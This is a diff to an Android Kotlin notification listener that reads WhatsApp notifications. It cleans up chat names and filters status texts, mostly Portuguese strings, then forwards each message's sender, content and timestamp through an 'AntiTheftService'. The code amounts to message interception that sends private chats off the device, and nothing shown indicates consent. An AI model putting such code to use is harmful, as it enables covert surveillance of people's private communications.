@@ -82,24 +82,26 @@ class WhatsAppNotificationListener : NotificationListenerService() {
                 ?: bundle.getCharSequence("sender")?.toString()?.trim()
                 ?: ""
 
-            val isGroup = extras.getBoolean(Notification.EXTRA_IS_GROUP_CONVERSATION, false) ||
-                    conversationTitle.isNotBlank()
+                    val isGroup = extras.getBoolean(Notification.EXTRA_IS_GROUP_CONVERSATION, false) ||
+                            conversationTitle.isNotBlank()
 
-            // For 1-on-1 chats the conversationTitle is usually empty and sender is the contact name.
-            // For groups: conversationTitle = group name, sender = person name.
-            val chatName = conversationTitle.ifBlank { sender }
-            if (chatName.isBlank()) continue
+                    // For 1-on-1 chats the conversationTitle is usually empty and sender is the contact name.
+                    // For groups: conversationTitle = group name, sender = person name.
+                    val chatName = normalizeChatName(conversationTitle.ifBlank { sender })
+                    if (chatName.isBlank() || isGenericName(chatName)) continue
 
-            val body = if (isGroup && sender.isNotBlank() && conversationTitle.isNotBlank() && !text.startsWith(sender)) {
-                "$sender: $text"
-            } else text
+                    if (isStatusText(text)) continue
 
-            result.add(WhatsMessage(
-                address = chatName,
-                name = chatName,
-                content = body,
-                timestamp = timestamp
-            ))
+                    val body = if (isGroup && sender.isNotBlank() && conversationTitle.isNotBlank() && !text.startsWith(sender)) {
+                        "$sender: $text"
+                    } else text
+
+                    result.add(WhatsMessage(
+                        address = chatName,
+                        name = chatName,
+                        content = body,
+                        timestamp = timestamp
+                    ))
         }
 
         return result
@@ -115,15 +117,17 @@ class WhatsAppNotificationListener : NotificationListenerService() {
 
         if (rawText.isBlank()) return result
 
+        if (isStatusText(rawText)) return result
+
         // Skip useless generic summaries (e.g. "WhatsApp", "Nova mensagem", "X mensagens")
-        val title = cleanTitle(rawTitle)
+        val title = normalizeChatName(cleanTitle(rawTitle))
 
         // "(15 mensagens): João: oi" -> handle summary prefix
         val text = cleanSummaryPrefix(rawText)
 
         // Group chats often format content as "Sender Name: message text"
         val (sender, body) = parseGroupSender(text)
-        val chatName = title.ifBlank { sender }
+        val chatName = title.ifBlank { normalizeChatName(sender) }
         if (chatName.isBlank() || isGenericName(chatName)) return result
 
         result.add(WhatsMessage(
@@ -158,22 +162,56 @@ class WhatsAppNotificationListener : NotificationListenerService() {
 
     private fun isGenericName(name: String): Boolean {
         val lower = name.lowercase()
-        return lower == "whatsapp" || lower == "nova mensagem" || lower == "mensagem" ||
+        return lower == "whatsapp" || lower == "wa business" || lower == "whatsapp business" ||
+                lower == "nova mensagem" || lower == "mensagem" ||
                 lower == "conversas" || lower == "chats" || lower == "status" ||
-                lower == "ligações" || lower == "calls"
+                lower == "ligações" || lower == "calls" ||
+                lower == "backup em andamento" || lower == "backup"
+    }
+
+    private fun isStatusText(text: String): Boolean {
+        val lower = text.lowercase()
+        return lower.contains("procurando novas mensagens") ||
+                lower.contains("preparando o backup") ||
+                lower.contains("backup em andamento") ||
+                lower.contains("mensagens de") || // summary like "9 mensagens de 4 conversas"
+                lower == "nova mensagem" ||
+                lower == "mensagem" ||
+                lower == "📷 foto" || // standalone media summary without sender
+                lower == "🎤 áudio" ||
+                lower == "🎥 vídeo"
     }
 
     private fun sendWhatsAppMessage(msg: WhatsMessage) {
         try {
-            val address = Json.encodeToString(String.serializer(), msg.address)
-            val name = Json.encodeToString(String.serializer(), msg.name)
+            val cleanName = normalizeChatName(msg.address)
+            if (cleanName.isBlank()) return
+            val address = Json.encodeToString(String.serializer(), cleanName)
+            val name = Json.encodeToString(String.serializer(), cleanName)
             val content = Json.encodeToString(String.serializer(), msg.content)
             val payload = """{"type":"WHATSAPP_MESSAGE","direction":"in","address":$address,"name":$name,"content":$content,"timestamp":${msg.timestamp}}"""
             val sent = AntiTheftService.sendRawMessage(payload)
-            Log.d("WhatsAppListener", "forwarded message to ${msg.address}: $sent")
+            Log.d("WhatsAppListener", "forwarded message to $cleanName: $sent")
         } catch (e: Exception) {
             Log.e("WhatsAppListener", "Failed to forward message: ${e.message}")
         }
+    }
+
+    /**
+     * Removes message-count suffixes and status prefixes from chat names so
+     * messages from the same conversation are not split into multiple profiles.
+     */
+    private fun normalizeChatName(name: String): String {
+        var clean = name.trim()
+
+        // Remove suffixes like "(6 mensagens)", "(2 mensagens novas)", ": 3 mensagens"
+        clean = clean.replace(Regex("\\s*[(\\[]\\d+\\s+mensagens?\\s*(novas?)?[)\\]].*$", RegexOption.IGNORE_CASE), "")
+        clean = clean.replace(Regex("\\s*:\\s*\\d+\\s+mensagens?.*$", RegexOption.IGNORE_CASE), "")
+
+        // Remove trailing colon fragments
+        clean = clean.replace(Regex("\\s*:.*$"), "")
+
+        return clean.trim()
     }
 
     private data class WhatsMessage(
